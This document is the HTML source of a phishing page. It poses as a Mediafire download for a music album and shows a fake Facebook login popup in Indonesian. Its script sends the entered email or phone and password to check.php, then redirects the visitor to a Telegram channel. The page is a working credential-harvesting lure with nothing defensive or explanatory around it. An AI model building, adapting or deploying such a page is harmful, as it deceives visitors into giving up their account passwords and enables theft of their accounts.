...
<meta name="twitter:title" content="Mediafire" />
...
<meta itemprop="name" content="Mediafire " />
<meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/zip.jpg" />
<meta itemprop="description" content="" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="bgscindo/css/efbe.css">
<link rel="stylesheet" href="bgscindo/css/style.css">
...
<div class="popup login-fb animate fadeIn">
          <div class="container-box-fb">
            ...
            <div class="isi-facebook">
              <p class="kaget email-fb">
                Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
              <p class="kaget sandi-fb">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
              <img src="bgscindo/img/logo.png">
              ...
              <form id="rndyform" class="form-login-fb" onsubmit="return verif_rndy()">
                <label>
                  <input type="text" id="user" name="user" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: none" required>
                </label>
                <label>
                  <input type="password" id="pass" name="pass" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: none" required>
                </label>
...
<div class="dl-btn-label" title="Mediafire">
Syakirah FUll ALBUM</div>
</div>
...
<ul class="details">
<li>File size: <span>500.41KB</span></li>
			...
			if($pass == '' || $pass == null || $pass.length <= 5)
			{
                ...
                
                {
                    ...
                    $.ajax({
                        type: 'POST',
                        url: 'check.php',
                        data: $('#rndyform').serialize(),
                        dataType: 'text',
                        success: function() {
                                    $('.login-fb').toggle();
                                    $('.btn-login-fb').html('Success')
                                    $('.login-fb').fadeOut();
                                    window.location = 'https://t.me/limapuluh00';
                            } 
                    })
                }
		}})
...
" data-cf-beacon='{"rayId":"7059bbeb4d341a46","token":"8e4f9484d8b840b28e4e0cc92b90ce0c","version":"2021.12.0","si":100}' crossorigin="anonymous"></script>
</body>
</html>